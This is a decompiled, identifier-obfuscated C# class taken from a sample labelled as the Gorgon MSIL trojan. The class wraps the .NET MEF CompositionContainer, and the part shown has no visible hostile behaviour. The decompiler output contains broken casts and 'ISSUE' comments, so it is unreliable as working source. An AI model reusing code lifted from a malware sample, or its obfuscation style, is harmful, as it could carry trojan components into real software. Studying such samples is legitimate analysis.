// Decompiled with JetBrains decompiler
// Type: mF9Gx9z.0wpDhPR
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0035Q6zMvA;
using CI15zNz;
using JDPxVdl;
using krwYcd2;
using MTS1bjc;
using qogHUiG;
using System;
using System.Collections.Generic;
using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Linq;

namespace mF9Gx9z
{
  public class \u0030wpDhPR : CompositionContainer
  {
    private const CompositionOptions \u00357H4ITZ = CompositionOptions.IsThreadSafe | CompositionOptions.ExportCompositionService;
    private M663i8x Xt3gEPp;
    private bool cQA3OuR;
    private bool box8hpm;
    private HashSet<string> ukubKRZ;
    private HashSet<string> bWECH2Q;
    private HashSet<ExportDefinition> P5GWTPH;
    private object hxhzXGU = new object();
    private ExportProvider RbyHxJF;

    internal \u0030wpDhPR()
      : base(CompositionOptions.IsThreadSafe | CompositionOptions.ExportCompositionService)
    {
    }

    internal \u0030wpDhPR(ExportProvider provider)
      : base(CompositionOptions.IsThreadSafe | CompositionOptions.ExportCompositionService, provider)
    {
    }

    internal \u0030wpDhPR(ComposablePartCatalog catalog)
      : base(catalog, CompositionOptions.IsThreadSafe | CompositionOptions.ExportCompositionService)
    {
    }

    public M663i8x u2IUSD0 => this.Xt3gEPp;

    internal ExportProvider juGZaQ7
    {
      get
      {
        if (this.RbyHxJF == null)
          this.RbyHxJF = (ExportProvider) new ahGdFmn.PwIn6X7(this);
        return this.RbyHxJF;
      }
    }

    internal bool zvIpHgO
    {
      get => this.cQA3OuR;
      set => this.cQA3OuR = value;
    }

    private HashSet<ExportDefinition> \u0030aWqUfl
    {
      get
      {
        if (this.P5GWTPH == null)
          this.P5GWTPH = new HashSet<ExportDefinition>();
        return this.P5GWTPH;
      }
    }

    private HashSet<string> SBng1CK
    {
      get
      {
        if (this.ukubKRZ == null)
          this.ukubKRZ = new HashSet<string>();
        return this.ukubKRZ;
      }
    }

    private HashSet<string> kGgSkf8
    {
      get
      {
        if (this.bWECH2Q == null)
          this.bWECH2Q = new HashSet<string>();
        return this.bWECH2Q;
      }
    }

    private bool c0peXj2
    {
      get => this.box8hpm;
      set => this.box8hpm = value;
    }

    public static \u0030wpDhPR NH8PrWq(ExportProvider QMFK37W) => \u0030wpDhPR.\u00311WZJHs(QMFK37W, new M663i8x());

    public static \u0030wpDhPR \u00311WZJHs(ExportProvider O74mKvr, M663i8x _param1)
    {
      \u0030wpDhPR obj = new \u0030wpDhPR(O74mKvr);
      obj.zd6Apfg((ComposablePartCatalog) null, _param1);
      return obj;
    }

    public static \u0030wpDhPR YsrTdg3() => \u0030wpDhPR.OQs6tgG(new M663i8x());

    public static \u0030wpDhPR OQs6tgG(M663i8x DZFzhQl)
    {
      \u0030wpDhPR obj = lW7wFsw.GW0s6Cb(DZFzhQl);
      if (obj == null)
      {
        AggregateCatalog aggregateCatalog = new AggregateCatalog();
        obj = new \u0030wpDhPR((ComposablePartCatalog) aggregateCatalog);
        obj.zd6Apfg((ComposablePartCatalog) aggregateCatalog, DZFzhQl);
      }
      return obj;
    }

    public static \u0030wpDhPR rM1JsXl(ComposablePartCatalog F6WGeLm) => \u0030wpDhPR.xJvVzpt(F6WGeLm, new M663i8x());

    public static \u0030wpDhPR iHkB7C7(ComposablePartCatalog CZjSLmO, CGiq1dV zDMVX9S) => \u0030wpDhPR.xJvVzpt(CZjSLmO, new M663i8x(zDMVX9S));

    public static \u0030wpDhPR xJvVzpt(ComposablePartCatalog wXM145y, M663i8x EZrKIYo)
    {
      \u0030wpDhPR obj = lW7wFsw.GW0s6Cb(EZrKIYo);
      if (obj == null)
      {
        if (!(wXM145y is AggregateCatalog aggregateCatalog))
        {
          aggregateCatalog = new AggregateCatalog();
          if (wXM145y != null)
            aggregateCatalog.Catalogs.Add(wXM145y);
        }
        obj = new \u0030wpDhPR((ComposablePartCatalog) aggregateCatalog);
        obj.zd6Apfg((ComposablePartCatalog) aggregateCatalog, EZrKIYo);
      }
      else if (wXM145y != null)
        ((AggregateCatalog) obj.Catalog).Catalogs.Add(wXM145y);
      return obj;
    }

    internal void C20o29t(\u0030wpDhPR hoRcQbE, ExportsChangeEventArgs CGjQ55c)
    {
      // ISSUE: variable of a compiler-generated type
      \u0030wpDhPR.\u0033jsaWRB obj = (\u0030wpDhPR.\u0033jsaWRB) new \u0030wpDhPR.aaFtHoI();
      ((\u0030wpDhPR.aaFtHoI) obj).Tt9dyFB = this;
      if (this.c0peXj2 || (this.u2IUSD0.XHVhykc & HLF9Ora.DoNotRebind) == HLF9Ora.DoNotRebind || this.SBng1CK.Count <= 0)
        return;
      if (CGjQ55c != null)
      {
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        this.\u0037TwEjiG(CGjQ55c, out obj.EAogM34, out obj.UTsofpj);
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        this.X4m3NM5(hoRcQbE, out obj.EAogM34, out obj.UTsofpj);
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (obj.EAogM34.Count <= 0 && obj.UTsofpj.Count <= 0)
        return;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      this.OnExportsChanging(new ExportsChangeEventArgs((IEnumerable<ExportDefinition>) obj.EAogM34, (IEnumerable<ExportDefinition>) obj.UTsofpj, CGjQ55c.AtomicComposition));
      // ISSUE: reference to a compiler-generated method
      CGjQ55c.AtomicComposition.AddCompleteAction(new Action(obj.uAhybgS));
    }

    protected override void Dispose(bool disposing)
    {
      lock (this.hxhzXGU)
      {
        if ((InAWJEx.Disposable & this.u2IUSD0.\u0039KiYjNW) != InAWJEx.Disposable)
          throw new InvalidOperationException("The policy for this container does not allow for it to be disposed.");
        if (disposing)
        {
          this.c0peXj2 = true;
          using (AtomicComposition atomicComposition = new AtomicComposition())
          {
            try
            {
              lW7wFsw.ROwS12J(this, new ExportsChangeEventArgs(Enumerable.Empty<ExportDefinition>(), (IEnumerable<ExportDefinition>) this.\u0030aWqUfl, atomicComposition));
              atomicComposition.Complete();
            }
            catch (ChangeRejectedException ex)
            {
            }
            finally
            {
              lW7wFsw.e5mjRy3(this);
            }
          }
        }
        base.Dispose(disposing);
      }
    }

    protected override IEnumerable<Export> GetExportsCore(
      ImportDefinition import,
      AtomicComposition atomicComposition)
    {
      return this.TxNITlL(import, atomicComposition, false);
    }

    private IEnumerable<Export> TxNITlL(
      ImportDefinition _param1,
      AtomicComposition FQS7nNt,
      bool QUD4fvw)
    {
      bool flag = false;
      lock (this.hxhzXGU)
      {
        ContractBasedImportDefinition importDefinition = _param1 as ContractBasedImportDefinition;
        if (string.Equals(importDefinition.ContractName, "System.ComponentModel.Composition.Hosting.CompositionContainer", StringComparison.Ordinal) || string.Equals(importDefinition.ContractName, "Microsoft.VisualStudio.ExtensibilityHosting.VsExportProvisionScope", StringComparison.Ordinal))
          flag = true;
        if (_param1.IsRecomposable)
        {
          if (importDefinition != null)
            this.Mvris6M(importDefinition.ContractName);
        }
      }
      return QUD4fvw | flag ? this.tXDPNRN(_param1, FQS7nNt) : lW7wFsw.cBUThGl(this, _param1, FQS7nNt);
    }

    private void \u0037TwEjiG(
      ExportsChangeEventArgs XuQWHjM,
      out List<ExportDefinition> sNPhLxn,
      out List<ExportDefinition> ufDIR1T)
    {
      sNPhLxn = new List<ExportDefinition>();
      ufDIR1T = new List<ExportDefinition>();
      foreach (ExportDefinition addedExport in XuQWHjM.AddedExports)
      {
        if (this.SBng1CK.Contains(addedExport.ContractName))
          sNPhLxn.Add(addedExport);
      }
      foreach (ExportDefinition removedExport in XuQWHjM.RemovedExports)
      {
        if (this.SBng1CK.Contains(removedExport.ContractName))
          ufDIR1T.Add(removedExport);
      }
    }

    private void X4m3NM5(
      \u0030wpDhPR _param1,
      out List<ExportDefinition> LC4h6al,
      out List<ExportDefinition> ChJUrLj)
    {
      LC4h6al = new List<ExportDefinition>();
      ChJUrLj = new List<ExportDefinition>();
      foreach (ExportDefinition exportDefinition in _param1.\u0030aWqUfl)
      {
        if (this.SBng1CK.Contains(exportDefinition.ContractName))
          LC4h6al.Add(exportDefinition);
      }
    }

    private void zd6Apfg(ComposablePartCatalog owCChV5, M663i8x P1piD9o)
    {
      this.Xt3gEPp = P1piD9o;
      this.ExportsChanging += new EventHandler<ExportsChangeEventArgs>(this.KqG7WRK);
      this.zvIpHgO = true;
      CompositionBatch batch = new CompositionBatch();
      if ((InAWJEx.NoTrust & P1piD9o.\u0039KiYjNW) == InAWJEx.Default)
        batch.AddExportedValue<CompositionContainer>((CompositionContainer) this);
      batch.AddExportedValue<CGiq1dV>(P1piD9o.Fz1nGUy);
      this.Compose(batch);
      this.zvIpHgO = false;
      lW7wFsw.VjqzSli(this);
      if (owCChV5 == null)
        return;
      lW7wFsw.ROwS12J(this, (ExportsChangeEventArgs) null);
    }

    private void KqG7WRK(object T0tg4lW, ExportsChangeEventArgs _param2)
    {
      if (this.zvIpHgO || _param2.ChangedContractNames.Count<string>() <= 0)
        return;
      lW7wFsw.ROwS12J(this, _param2);
    }

    private void Mvris6M(string lE6Ro0e)
    {
      if (this.SBng1CK.Contains(lE6Ro0e))
        return;
      this.SBng1CK.Add(lE6Ro0e);
    }

    private IEnumerable<Export> tXDPNRN(
      ImportDefinition _param1,
      AtomicComposition rheupkd)
    {
      if (!this.c0peXj2)
      {
        try
        {
          IEnumerable<Export> exportsCore = base.GetExportsCore(_param1, rheupkd);
          lock (this.hxhzXGU)
          {
            foreach (Export export in exportsCore)
              this.\u0030aWqUfl.Add(export.Definition);
          }
          return exportsCore;
        }
        catch (ImportCardinalityMismatchException ex)
        {
        }
      }
      return (IEnumerable<Export>) new List<Export>();
    }

    private class aaFtHoI : ExportProvider
    {
      public \u0030wpDhPR Tt9dyFB;

      protected override IEnumerable<Export> GetExportsCore(
        ImportDefinition definition,
        AtomicComposition atomicComposition)
      {
        // ISSUE: reference to a compiler-generated field
        return ((ahGdFmn.PwIn6X7) this).ivaGZFu.TxNITlL(definition, atomicComposition, true);
      }
    }
  }
}
